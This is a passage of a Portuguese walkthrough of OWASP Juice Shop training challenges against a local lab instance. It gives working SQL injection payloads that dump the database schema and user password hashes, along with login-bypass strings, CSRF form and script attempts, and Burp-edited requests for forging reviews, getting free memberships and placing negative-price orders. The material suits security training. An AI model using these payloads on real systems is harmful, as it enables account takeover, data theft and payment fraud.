Cookie: welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=en; continueCode=xlh4txIjsNU1HQuNhaTvFbfpSLiBSmOuKKhzvfZ6SNxuxKI4bUpWHvMFOWfLwUNatbzcz3T1JHel; io=zsZukWhvf24M091LAAAC; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMS0xMi0yMSAyMzoyNTo1Ny41ODggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMS0xMi0yMSAyMzoyNTo1Ny41ODggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQwMTMwNDQwLCJleHAiOjE2NDAxNDg0NDB9.EQUD3_G9-fsqTu50KoJS6qhCBBsmB4RgLPdPewBaRDVGMML470flR9vfeUERe-EWz_8v0MGJ8JG3PBUlhuZD4gmxh2YI8cKQegLlum5bq3aPbY32Cfz2v-d3lP5m5yc1AlQ4SEL50FLee4lxPee_6-gL_VrbWo6pkWuigVvDlwg
Content-Length: 11

username=mc
```
* Dá pra ver que o site do desafio é um Live HTML editor
* Para fazer um CSRF atack pecisamos fazer Login no Juice Shop em um navegador e no editor HTML reconstruir o formulário:
```
<form action="http://192.168.56.30:3000/profile" method="POST">
  <input name="username" value="mc"/>
  <input type="submit"/>
</form>
```
*  Se o Access Control realmente for `broken`, o navegador vai enviar a requisição e adicionar os cookies com o devido token de autenticação -> Navegadores modernos nem chegam a enviar a requisição.
* Outra tentativa: construindo um <script></script>
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://192.168.56.30:3000/profile", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('Cookie', 'welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=en; continueCode=xlh4txIjsNU1HQuNhaTvFbfpSLiBSmOuKKhzvfZ6SNxuxKI4bUpWHvMFOWfLwUNatbzcz3T1JHel; io=zsZukWhvf24M091LAAAC; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMS0xMi0yMSAyMzoyNTo1Ny41ODggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMS0xMi0yMSAyMzoyNTo1Ny41ODggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQwMTMwNDQwLCJleHAiOjE2NDAxNDg0NDB9.EQUD3_G9-fsqTu50KoJS6qhCBBsmB4RgLPdPewBaRDVGMML470flR9vfeUERe-EWz_8v0MGJ8JG3PBUlhuZD4gmxh2YI8cKQegLlum5bq3aPbY32Cfz2v-d3lP5m5yc1AlQ4SEL50FLee4lxPee_6-gL_VrbWo6pkWuigVvDlwg');
xhr.send(JSON.stringify({
    value: "username=mc"
}));
</script>
```
* Refused to set unsafe header "Cookie" -> O Chrome se recusa a setar o Cookie de autorização…
* Attempt to set a forbidden header was denied: Cookie -> Firefox tb…
* To solve this challenge you need much older browser, e.g. FF v. 56 and the same code 🙂
* PARA SOLUCIONAR A FORCA:
	* Usando o Burp Suit podemos apenas trocar o Header “Origin” -> Isso é meio alternativo de resolver essa questão. 
```
POST /profile HTTP/1.1
Content-Length: 11
Origin: http://htmledit.squarefree.com
Content-Type: application/x-www-form-urlencoded
Cookie: welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=en; continueCode=xlh4txIjsNU1HQuNhaTvFbfpSLiBSmOuKKhzvfZ6SNxuxKI4bUpWHvMFOWfLwUNatbzcz3T1JHel; io=nFPzUvErhzLJMawsAAAF; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTEyLTIxIDIzOjI1OjU3LjU4OCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTEyLTIxIDIzOjU0OjE4Ljk4OSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NDAxMzExNzAsImV4cCI6MTY0MDE0OTE3MH0.P6b18_YqrQ0-baZ6yJ1FStr1UksPzArNjNOnarBrB6EEnDVD3bAFNFkNwd3QJ37LO4D-OjPI6I9jooVzN06zuMKE1eK6Cn2V1WZURbFE9d-0ifygCWMI5OEQKSI9vi77rjTaiSOi5KwB-okH57ekUi5u4cZUXXnJwkebaxvxEV0

username=mc
```

25. ***Injection/Database Schema*** -> Exfiltrate the entire DB schema definition via SQL Injection.
* Sabemos que o campo de email do Login é vulnerável.
* Temos que extrair o SCHEMA de um BANCO SQLITE, por definição, são as linhas da tabela:
```
CREATE TABLE sqlite_master(
   type text,
   name text,
   tbl_name text,
   rootpage integer,
   sql text
);
```
* Se eu pude-se fazer a query diretamente no banco seria:
* `SELECT * FROM sqlite_master `
* Vamos descobrir qts colunas tem a tabela Users na tentativa erro:
* Injetando email `' UNION SELECT null--`  e senha `12345` -> 
```
{
  "error": {
    "message": "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
    "stack": "...",
    "name": "SequelizeDatabaseError",
    "parent": { ...
      "sql": "SELECT * FROM Users WHERE email = ' ' UNION SELECT null --' AND password = 'e10adc3949ba59abbe56e057f20f883e' AND deletedAt IS NULL"
    },
    "original": {...},
    "sql": "..."
  }
}
```
* EXTRA: descobrir o algoritmo da hash -> [Online hash calculator  - Online tools](https://www.tools4noobs.com/online_tools/hash/) -> Testar a senha `12345` -> verificar qual o algoritmo que dá a hash `e10adc3949ba59abbe56e057f20f883e` -> ::MD5:: é o algoritmo de hash do Juice Shop! -> Pelo visto está sem o SALT -> Isso responde a questão  16.#Cryptographic Issues/Weird Crypto#

1) CONTINUANDO NO CAMPO SEARCH: Continuando a busca por campos vulneráveis, foi encontrado que pesquisa de produtos é vulnerável no parâmetro q -> `GET /rest/products/search?q='-- HTTP/1.1` ->  Uma msg de erro informa que deu SQLITE_ERROR. Dá pra perceber que a query  do lado do servidor é montada da seguinte maneira:
```
"SELECT * FROM Products WHERE ((name LIKE '%$input%' OR description LIKE '%$input%') AND deletedAt IS NULL) ORDER BY name"
```
* Injetando `'))--` -> Seleciona todos os produtos:
```
"data":[{
"id":1,
"name":"Apple Juice (1000ml)",
"description":"The all-time assic.",
"price":1.99,
"deluxePrice":0.99,
"image":"apple_juice.jpg",
"createdAt":"2021-12-07 00:58:42.935 +00:00",
"updatedAt":"2021-12-07 00:58:42.935 +00:00",
"deletedAt":null
}...]
```
* Injetando `')) UNION SELECT null-- ` -> `"message": "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns"`
* Injetando `'))%20UNION%20SELECT%20null,null,null,null,null,null,null,null,null` -> `"message": "Cannot read property 'locale' of null",` -> Tabela Products tem 9 colunas (id, name, description, price, deluxePrice, image, createdAt, updatedAt e deletedAt)
* Injetando `apple'))%20UNION%20SELECT%20null,name,type,tbl_name,sql,1,1,1,1%20FROM%20sqlite_master--`  -> Retorna o json com as informações de interesse nos campos respectivos:

![](./imgs/jsonq25.png)

* Resumindo:
```
"CREATE TABLE `Addresses` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `mobileNum` INTEGER, `zipCode` VARCHAR(255), `streetAddress` VARCHAR(255), `city` VARCHAR(255), `state` VARCHAR(255), `country` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `BasketItems` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, UNIQUE (`BasketId`, `ProductId`))"

"CREATE TABLE `Baskets` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `coupon` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `Captchas` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `captchaId` INTEGER, `captcha` VARCHAR(255), `answer` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)",

"CREATE TABLE `Cards` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `cardNum` INTEGER, `expMonth` INTEGER, `expYear` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `Challenges` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `key` VARCHAR(255), `name` VARCHAR(255), `category` VARCHAR(255), `description` VARCHAR(255), `difficulty` INTEGER, `hint` VARCHAR(255), `hintUrl` VARCHAR(255), `solved` TINYINT(1), `disabledEnv` VARCHAR(255), `tutorialOrder` NUMBER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"

"CREATE TABLE `Complaints` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `message` VARCHAR(255), `file` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `Deliveries` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` VARCHAR(255), `price` FLOAT, `deluxePrice` FLOAT, `eta` FLOAT, `icon` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"

"CREATE TABLE `Feedbacks` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `comment` VARCHAR(255), `rating` INTEGER NOT NULL, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `ImageCaptchas` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `image` VARCHAR(255), `answer` VARCHAR(255), `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"

"CREATE TABLE `Memories` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `caption` VARCHAR(255), `imagePath` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `PrivacyRequests` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `deletionRequested` TINYINT(1) DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"

"CREATE TABLE `Products` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` VARCHAR(255), `description` VARCHAR(255), `price` DECIMAL, `deluxePrice` DECIMAL, `image` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"

"CREATE TABLE `PurchaseQuantities` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE SET NULL ON UPDATE CASCADE, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `Quantities` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `limitPerUser` INTEGER DEFAULT NULL, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `Recycles` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER(4), `isPickup` TINYINT(1) DEFAULT 0, `date` DATETIME, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE, `AddressId` INTEGER REFERENCES `Addresses` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `SecurityAnswers` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `answer` VARCHAR(255), `UserId` INTEGER UNIQUE REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `SecurityQuestionId` INTEGER REFERENCES `SecurityQuestions` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"

"CREATE TABLE `SecurityQuestions` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `question` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"

"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"

"CREATE TABLE `Wallets` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `balance` INTEGER DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)"
```
2) . CONTINUANDO NO CAMPO EMAIL: injetando no email `' UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null,null` -> Invalid email or password. -> a tabela Users tem 13 colunas! -> Mas já sabemos até quais são da análise da COLUNA sql da TABELA sqlite_master (`id` ,  `username` ,  `email` ,  `password` ,  `role`,  `deluxeToken`,  `lastLoginIp` ,  `profileImage`,  `totpSecret` ,  `isActive` ,  `createdAt`,  `updatedAt`,  `deletedAt` )

26. ***Improper Input Validation/Deluxe Fraud*** -> Obtain a Deluxe Membership without paying for it.
* Usando o Proxy do Burp Suit para enviar uma requisição de obtenção de deluxe membership com pagamento via wallet dentro com um usuário logado e com saldo
* No Burp Suite ->  Proxy  -> HTTP History -> Clicar com o botão direito do mouse na requsição de obtenção de membro deluxe que passou pelo Burp Proxy  `POST /rest/deluxe-membership HTTP/1.1` -> Send to Repeater -> A requisição que vai ser alterada possui o seguinte aspecto:
```
POST /rest/deluxe-membership HTTP/1.1
Host: 192.168.56.30:3000
Content-Length: 24
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ0…3mY
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Content-Type: application/json
Origin: http://192.168.56.30:3000
Referer: http://192.168.56.30:3000/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=rohatjIEsOU6HohETJFqfxSviJSJeunnhmQfg4SXMukQIrbUDbHZ9fDZtX3c9oF4k; language=en; io=rskyHS5TteetF0u_AAAH; token=eyJ0…3mY
Connection: close

{"paymentMode":"wallet"}
```
* Caso não haja saldo -> `{"status":"error","error":"Insuffienct funds in Wallet"}`
* Caso haja saldo -> `{"status":"success","data":{"confirmation":"Congratulations! You are now a deluxe member!","token":"eyJ0…"}}`
* Caso seja enviado um paymentMode vazio ->  `{"paymentMode":""}`  ->  `{"status":"success","data":{"confirmation":"Congratulations! You are now a deluxe member!","token":"eyJ…saeo"}}` 

27. ***Injection/Login Bender*** -> Log in with Bender's user account.
* EMAIL: bender@juice-sh.op'--
* SENA: qqcoisa

28. ***Injection/Login Jim*** -> Log in with Jim's user account.
* EMAIL: jim@juice-sh.op'--
* SENA: qqcoisa

29. ***Broken Access Control/Forged Feedback*** -> Post some feedback in another users name.
*  Vamos tentar usar o Proxy do Burp Suit para reenviar uma requisição de feedback com um usuário logado
* No Burp Suite ->  Proxy  -> HTTP History -> Clicar com o botão direito do mouse na requsição de review enviada anteriormente e que passou pelo Burp Suite Proxy  `POST /api/Feedbacks/ HTTP/1.1` -> Send to Repeater -> A requsição que vai ser alterada possui o seguinte aspecto:
```
POST /api/Feedbacks/ HTTP/1.1
Host: 192.168.56.30:3000
Content-Length: 88
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ0...YPs
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Content-Type: application/json
Origin: http://192.168.56.30:3000
Referer: http://192.168.56.30:3000/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: welcomebanner_status=dismiss; cookieconsent_status=dismiss; io=OP...AAA; token=eyJ0e...; language=en
Connection: close

{"UserId":3,"captchaId":0,"captcha":"4","comment":"abc (***der@juice-sh.op)","rating":1}
```
* Apesar de estar enviado os Token de autorização , a requisição possui o UserId do usuário como parâmetro -> Trocamos o UserId para `2` e consequimos fazer o feedback no nome do JIM:

30. ***Broken Access Control/Forged Review*** -> Post a product review as another user or edit any user's existing review.
* No Burp Suit -> reenviar uma requisição de review com um usuário logado
* No Burp Suite ->  Proxy  -> HTTP History -> Clicar com o botão direito do mouse na requsição de review enviada anteriormente e que passou pelo Burp Suite Proxy  `PUT /rest/products/24/reviews` -> Send to Repeater -> A requsição que vai ser alterada possui o seguinte aspecto:
```
PUT /rest/products/24/reviews HTTP/1.1
Host: 192.168.56.30:3000
Content-Length: 51
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ0...FYPs
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Content-Type: application/json
Origin: http://192.168.56.30:3000
Referer: http://192.168.56.30:3000/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=pt_BR; io=OPEhPs4Ew8dtY-MpAAAA; continueCode=KOh...vy; token=eyJ0...FYPs
Connection: close

{"message":"qqcoisa","author":"bender@juice-sh.op"}
```
* Apesar de estar enviado os Token de autorização , a requisição possui o email do usuário como parâmetro -> Trocamos o email para `jim@juice-sh.op` e consequimos fazer o comentário no nome do JIM:

![](./imgs/jim.png)

31. ***Sensitive Data Exposure/Login Amy*** -> Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")
* Google: “One Important Final Note” ->  https://www.grc.com/haystack.htm?1 :
```
One Important Final Note
The example with “D0g.....................” should not be taken literally because if everyone began padding their passwords with simple dots, attackers would soon start adding dots to their guesses to bypass the need for full searching through unknown padding. Instead, YOU should invent your own personal padding policy. You could put some padding in front, and/or interspersed through the phrase, and/or add some more to the end. You could put some characters at the beginning, padding in the middle, and more characters at the end. And also mix-up the padding characters by using simple memorable character pictures like “<->” or “[*]” or “^-^”  . . . but do invent your own!

If you make the result long and memorable, you'll have super-strong passwords that are also easy to use!
```
 -> 4My..................... (24 chars dos quais 21 chars `.`  e 93.83 billion trillion trillion centuries) -> Senha inválida
* Fazendo injection no parâmetro `q` da pesquisa:
```
GET /rest/products/search?q=apple'))%20UNION%20SELECT%20id,email,password,role,totpsecret,isActive,null,null,null%20FROM%20Users-- HTTP/1.1
Accept: */*


```
* Descobrimos da Amy:
```
{"id":11,
"name":"amy@juice-sh.op", --> email
"description":"030f05e45e30710c3ad3c32f00de0473",  --> password
"price":"customer",  --> role
"deluxePrice":"", --> totpsecret
"image":1,  --> isActive
"createdAt":null,"updatedAt":null,"deletedAt":null},
```
* No Score-Board, a coluna Status desse challenge -> unsolved ->  `This chalenge will make you go after a needle in a haystack. Click for more hints. ` -> https://pwning.owasp-juice.shop/part2/sensitive-data-exposure.html#log-in-with-amys-original-user-credentials

![](./imgs/amy_and_kif.jpg) Amy and Kif Kroker  

> As with so many other characters from Futurama this challenge is of course about logging in as Amy from that show. In the picture above you see her together with her alien husband Kif.  

> The challenge description contains a few sentences which give away some information how Amy decided to strengthen her password.  

> Obviously, Amy - being a little dimwitted - did not put nearly enough effort and creativity into the password selection process.  
* K1f..................... (24 chars dos quais 21 chars `.`  e 93.83 billion trillion trillion centuries) -> Senha válida!! -> `{"authentication":{"token":"eyJ...lyA","bid":4,"umail":"amy@juice-sh.op"}}`


32. ***Broken Access Control/Manipulate Basket*** -> Put an additional product into another user’s shopping basket.
* No Burp Suite ->  Proxy  -> HTTP History -> Clicar com o botão direito do mouse na requsição de adicionar  enviada anteriormente e que passou pelo Burp Suite Proxy  `POST /api/BasketItems/ HTTP/1.1` -> Send to Repeater -> A requsição que vai ser alterada possui o seguinte aspecto:
```
POST /api/BasketItems/ HTTP/1.1
Host: 192.168.56.30:3000
Content-Length: 43
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ0...
X-User-Email: jim@juice-sh.op'--
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Content-Type: application/json
Origin: http://192.168.56.30:3000
Referer: http://192.168.56.30:3000/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: welcom...
Connection: close

{"ProductId":2,"BasketId":"2","quantity":1}
```
* OBSERVAÇÕES:
	* Caso ok a requisição cria um BasketItem
	* Só aceita BasketId ser do usuário portador do token da requisição,ou seja, sabendo que outro usuário tem um BasketId=1, não dá certo trocar esse parâmetro sem usar o Token do usuário correto ->  `{'error' : 'Invalid BasketId'}`
	* Só aceita qd estou linkando Produtos e Cestas diferentes --> Qd são iguais dá erro SQL:
	Product ID must be unique , BasketId must be unique -->
```
INSERT INTO `BasketItems` (`id`,`quantity`,`createdAt`,`updatedAt`,`BasketId`,`ProductId`) VALUES (NULL,$1,$2,$3,$4,$5);
```
*    * CASO BasketId e ProductId sejam únicos na tabela BasketItems e o BasketId pertença ao usuário cujo token originalmente lhe pertence: 
```
{
"status":"success",
"data":{ 
	"id":16,
	"ProductId":6,
	"BasketId":"10",
	"quantity":1,
	"updatedAt":"2021-12-22T02:25:14.966Z",
	"createdAt":"2021-12-22T02:25:14.966Z"
	}
}
```
*    * A solução é poluir a requisição com dois BasketIds:

![](imgs/2basketids.png)

33. ***Improper Input Validation/Payback Time*** -> Place an order that makes you rich.
* Através do Burp Suit percebemos a requisição para checar a lista de produtos de uma cesta: 
```
GET /rest/basket/2 HTTP/1.1
Accept: */*
Authorization: Bearer eyJ0...HtA
Connection: close


```
* Se estamos querendo ganhar dinheiro da plataforma, uma alternativa é postar uma ordem com valor negativo -> SaldoFinal = SaldoAtual - (-TotalCesta) = SaldoAtual + TotalCesta
* Sabendo que TotalCesta = SOMA( quantidade  x ValorUnit de cada item )  -> Não podemos alterar o valor unitário mas podemos alterar a quantidade. SERÁ QUE PODEMOS COLOCAR UMA QUANTIDADE NEGATIVA? -> Não pelo plataforma… e Pelo BURP?
* Ao tentar adicionar 1 item na plataforma a seguinte requisição foi enviada:
```
PUT /api/BasketItems/12 HTTP/1.1
Accept: */*
Authorization: Bearer eyJ0...HtA
Content-Type: application/json
Connection: close
Content-Length: 16

{"quantity":2}
```
* Enviar a requisição para o Repeater do Burp e alterar a qt para -10. Assim teremos uma cesta com valor total negativo!

![](./imgs/cestanegativa.png)

* Prosseguir no checkout com método de pagamento “wallet” para receber o dinheiro

34. ***Security through Obscurity/Privacy Policy Inspection*** -> Prove that you actually read our privacy policy. -> Only by visiting a **special URL** you can confirm that you read it carefully. Click for more Hints: 
> First you should obviously solve Read our privacy policy.  
> It is fine to use the mouse cursor to not lose sight of the paragraph you are currently reading.  
> If you find some particularly hot sections in the policy you might want to melt them together similar to what you might have already uncovered in Apply some advanced cryptanalysis to find the real easter egg.  
* Em http://192.168.56.30:3000/#/privacy-security/privacy-policy -> Ao passar o mouse em algumas palavras o estado hover aciona um estilo brilhante -> esses elementos possui a classe `.hot`

![](./imgs/hot.png)

* Os elementos que possuem essa classe são:
```
<span _ngcontent-fkn-c202="" class="hot">http://192.168.56.30</span>
<span _ngcontent-fkn-c202="" class="hot">We may also</span>
<span _ngcontent-fkn-c202="" class="hot">instruct you</span>
<span _ngcontent-fkn-c202="" class="hot">to refuse all</span>
<span _ngcontent-fkn-c202="" class="hot">reasonably necessary</span>
<span _ngcontent-fkn-c202="" class="hot">responsibility</span>
```
* We may also instruct you to refuse all reasonably responsibility -> Também podemos instruí-lo a recusar qualquer responsabilidade razoável
* Parece que temos que montar um **special URL**  -> you might want to melt them together  -> Não podemos esquecer da porta da aplicação
```
http://192.168.56.30+porta+
We may also+
instruct you+
to refuse all+
reasonably necessary+
responsibility
```
* http://192.168.56.30:3000/Wemayalso/instructyou/torefuseall/reasonablynecessary/responsibility
* http://192.168.56.30:3000/We%20may%20also/instruct%20you/to%20refuse%20all/reasonably%20necessary/responsibility
* http://192.168.56.30:3000/We-may-also/instruct-you/to-refuse-all/reasonably-necessary/responsibility
* http://192.168.56.30:3000/We/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility -> acessar essa URL resolve o desafio!

35. ***Broken Authentication/GDPR Data Erasure*** -> Log in with Chris' erased user account.
* Fazendo SQLi para descobrir os dados da tabela Users em sua totalidade, podemos aproveitar a vulnerabilidade do parâmetro q na pesquisa:
```
GET /rest/products/search?q=apple'))%20UNION%20SELECT%20id,email,password,role,totpsecret,isActive,null,null,deletedAt%20FROM%20Users-- HTTP/1.1
Accept: */*

```
* Percebe-se que o usuário Chris é o único que possui o parâmetro `deletedAt!=null` 

![](./imgs/Chris.png)

* Isso bate com a query de Login -> `SELECT * FROM Users WHERE email = '$email' AND password = '$pass' AND deletedAt IS NULL;` 
* Assim no Login basta injetar `'OR id=14--` no campo de Email para solucionar:

![](./imgs/logininjection.png)


36. ***Broken Access Control/ Product Tampering*** -> Change the href of the link within the  [OWASP SSL Advanced Forensic Tool (O-Saft)](http://192.168.56.30:3000/#/search?q=OWASP%20SSL%20Advanced%20Forensic%20Tool%20(O-Saft))  product description into https://owasp.slack.com -> Look for one of the following: a) broken admin functionality; b) hole in restfull API; c) possibility for SQLInjection. Click for more hints:
> Theoretically there are three possible ways to beat this challenge:  
> -Finding an administrative functionality in the web application that lets you change product data  
> -Looking for possible holes in the RESTful API that would allow you to update a product  
> -Attempting an SQL Injection attack that sneaks in an UPDATE statement on product data  
> -In practice two of these three ways should turn out to be dead ends  
* A descrição do produto tem um link `More…` que leva para https://www.owasp.org/index.php/O-Saft

![](./imgs/owaspssl.png)

* Como no desafio 17. #Broken Access Control/Admin Section# Login como admin (admin@juice-sh.op:admin123) -> main.js -> Ctrl+f -> path: -> tem um `path: "accounting",`  mas dá erro 403 You are not allowed to access this page!
